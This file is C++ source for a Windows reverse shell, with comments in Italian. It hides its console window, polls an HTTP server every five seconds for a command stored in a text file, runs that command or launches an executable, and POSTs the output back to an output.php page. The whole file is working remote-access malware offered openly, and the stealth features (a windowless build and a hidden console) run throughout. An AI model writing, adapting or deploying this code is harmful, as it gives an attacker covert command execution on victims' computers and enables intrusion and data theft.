#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <sstream>
#include <iostream> 
#include <algorithm>
#include <array>
#include <sstream>
#include <iomanip>
#include <string>

#pragma comment(lib, "winhttp.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

//g++ -m32 -O2 -static-libgcc -static-libstdc++ -o reverseshell.exe ReverseShellWin.cpp -mwindows -lwininet

using namespace std;



string executeCommand(const string& command, bool getOutput);
string getCommand(const string& address, const string& page);
void sendOutput(const string& address, const string& page, const string& output);
bool sendHttpRequests(const string& address, const string& page, string& response, BOOL sendsParams, const string& data);
void hideWindow();
string URLEncode(const string& value);


string server = "localhost";
string shellNo = "0";
string shellFilePath = "/shell"+shellNo+".txt";
string outputPagePath = "/output.php";


int main(){

    string command;
    string result;
    int index;

    hideWindow();
    while (true){

        command = getCommand(server, shellFilePath);

        if(command.substr(0, 2) == "D|"){
            
            //metto in command il nome dell'eseguibile
            command = command.substr(2, command.size());

            executeCommand("start \"\" \""+command+"\"", false);
            sendOutput(server, outputPagePath, "Eseguito!");

        }
        else if(command != ""){
            
            result = executeCommand(command, true);
            if(result==""){

                sendOutput(server, outputPagePath, "output non letto");
            }
            else{
                sendOutput(server, outputPagePath, result);
            }

        }

        Sleep(5000);

    }


    return 0;

}

string executeCommand(const string& command, bool getOutput) {
    array<char, 128> buffer;
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }

    //nel caso di un esecuzione di un eseguibile bisogna bloccare la raccolta dell'output senò una volta eseguito
    //la shell si blocca
    if(getOutput){
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            result += buffer.data();
        }
        return result;
    }

    /*
    
        Esegue il comando di sistema: popen(command.c_str(), "r")
        esegue il comando specificato e apre un canale di comunicazione per leggere l'output.

        Crea un unique_ptr: unique_ptr<FILE, decltype(&pclose)> crea un unique_ptr che gestisce il puntatore a file (FILE*)
        restituito da popen.

        Specifica il deallocatore: decltype(&pclose) indica che il deallocatore da utilizzare è pclose,
        assicurando che il canale venga chiuso correttamente quando il unique_ptr esce dallo scope.
    
    */

}


string getCommand(const string& address, const string& page){

    string response;
    int index;

    sendHttpRequests(address, page, response, false, "");

    index = response.find_last_of(';');

    if(response[index+1] == '-'){
    
        return "";

    }
    else if(response[index+1] == ':'){

        return "D|"+response.substr(index+2, response.size());

    }

    return response.substr(index+1, response.size());
    //prende l'ultima riga che corrisponde al comando da eseguire
    //questo per mantenere uno storico

}


void sendOutput(const string& address, const string& page, const string& output){

    string response;
    
    sendHttpRequests(address, page, response, true, "output="+URLEncode(output)+"&shellNo="+shellNo);


}

bool sendHttpRequests(const string& address, const string& page, string& response, BOOL sendsParams, const string& data){

    DWORD bytesRead;
    char buffer[4096];
    string result;
    const wchar_t* headers = L"Content-Type: application/x-www-form-urlencoded";

    /*
    
        DWORD bytesRead;: Variabile che memorizzerà il numero di byte letti da una chiamata a InternetReadFile.
        char buffer[4096];: Un buffer temporaneo dove verranno memorizzati i dati letti da InternetReadFile.
        string result;: Stringa dove verranno accumulati i dati della risposta del server.
    
    */

    HINTERNET open = InternetOpenW(L"M#te", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

     /*
    
        L"M#TE": Nome dell'agente utente.
        INTERNET_OPEN_TYPE_DIRECT: Indica che si tratta di una connessione diretta senza l'uso di un proxy.
        NULL: Proxy name (non usato qui).
        NULL: Proxy bypass (non usato qui).
        0: Flag (nessun flag specifico).
        Se InternetOpen restituisce NULL, la sessione non è stata creata correttamente, quindi la funzione ritorna false.
    
    */

   if(!open) return false;

   HINTERNET conn = InternetConnectW(
                                        open, 
                                        wstring(address.begin(), address.end()).c_str(), 
                                        INTERNET_DEFAULT_HTTP_PORT, 
                                        NULL, 
                                        NULL, 
                                        INTERNET_SERVICE_HTTP, 
                                        0, 
                                        0
                                    );

    /*
        hInternet: Handle della sessione WinInet.
        wstring(server.begin(), server.end()).c_str(): Nome del server convertito in wstring.
        INTERNET_DEFAULT_HTTP_PORT: Porta HTTP predefinita (80).
        NULL: Nome utente (non usato qui).
        NULL: Password (non usato qui).
        INTERNET_SERVICE_HTTP: Specifica il servizio HTTP.
        0: Flag di connessione (nessuno specifico).
        0: Context (non usato qui).
        Se InternetConnect restituisce NULL, la connessione non è stata creata correttamente, quindi la funzione chiude la sessione WinInet e ritorna false.
    */

    if (!conn) {
        InternetCloseHandle(open);
        return false;
    }
    
    

    HINTERNET request = HttpOpenRequestW(   
                                            conn,
                                            L"POST", 
                                            wstring(page.begin(), page.end()).c_str(),
                                            NULL, 
                                            NULL, 
                                            NULL, 
                                            0, 
                                            0
                                        );

    /*
    
        hConnect: Handle della connessione.
        L"POST": Metodo HTTP (POST).
        wstring(path.begin(), path.end()).c_str(): Path sul server convertito in wstring.
        NULL: Versione HTTP (default).
        NULL: Referer (default).
        NULL: Tipi accettati (default).
        0: Flag (nessuno specifico).
        0: Context (non usato qui).
        Se HttpOpenRequest restituisce NULL, la richiesta non è stata creata correttamente, quindi la funzione chiude la connessione e la sessione WinInet e ritorna false.
    
    */

    if (!conn) {
        InternetCloseHandle(open);
        return false;
    }

     if (!request) {
        InternetCloseHandle(conn);
        InternetCloseHandle(open);
        return false;
    }


    if(sendsParams){

        BOOL results = HttpSendRequestW(request, headers, wcslen(headers), (PVOID)data.c_str(), data.length());

    }
    else{

        BOOL results = HttpSendRequestW(request, NULL, 0, NULL, 0);

        /*
            hRequest: Handle della richiesta HTTP.
            NULL: Header addizionali (nessuno specifico).
            0: Lunghezza degli header addizionali.
            (LPVOID)fileContent.c_str(): Corpo della richiesta (contenuto del file di log).
            fileContent.size(): Lunghezza del corpo della richiesta.
        */

    }

    while (InternetQueryDataAvailable(request, &bytesRead, 0, 0) && bytesRead > 0) {
        /*
        
            Questa funzione verifica quanti byte di dati sono attualmente disponibili per essere letti dalla risposta HTTP.
            request: L'handle della richiesta HTTP.
            &bytesRead: Puntatore alla variabile che riceverà il numero di byte disponibili.
            0: Riservato, deve essere 0.
            0: Riservato, deve essere 0.
            La funzione restituisce TRUE se ha successo, e FALSE se fallisce.
            Il ciclo while continua a eseguire finché ci sono dati disponibili (bytesRead > 0).
        
        */
        if (InternetReadFile(request, buffer, min(bytesRead, (DWORD)sizeof(buffer)), &bytesRead) && bytesRead > 0) {
            /*
            
                Questa funzione legge i dati disponibili dalla risposta HTTP e li memorizza nel buffer.
                request: L'handle della richiesta HTTP.
                buffer: Puntatore al buffer dove verranno memorizzati i dati letti.
                min(bytesRead, sizeof(buffer)): Specifica il numero massimo di byte da leggere. 
                Usa il valore minimo tra bytesRead e la dimensione del buffer per evitare di superare i limiti del buffer.

                &bytesRead: Puntatore alla variabile che riceverà il numero effettivo di byte letti.
                La funzione restituisce TRUE se ha successo e FALSE se fallisce.
                Il blocco if viene eseguito solo se la lettura ha successo (InternetReadFile restituisce TRUE)
                e se ci sono dati letti (bytesRead > 0).
            
            */
            result.append(buffer, bytesRead);
        }
    }


    response = result;

    InternetCloseHandle(request);
    InternetCloseHandle(conn);
    InternetCloseHandle(open);

    return true;

}


void hideWindow(){

    HWND hwnd = GetConsoleWindow(); //ottiene la finestra della console
    ShowWindow(hwnd, SW_HIDE);      //la nasconde
}

string URLEncode(const string& value) {
    ostringstream escaped;
    escaped.fill('0');
    escaped << hex;

    for (char c : value) {
        if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else {
            escaped << '%' << setw(2) << (int)(unsigned char)c;
        }
    }

    return escaped.str();
}
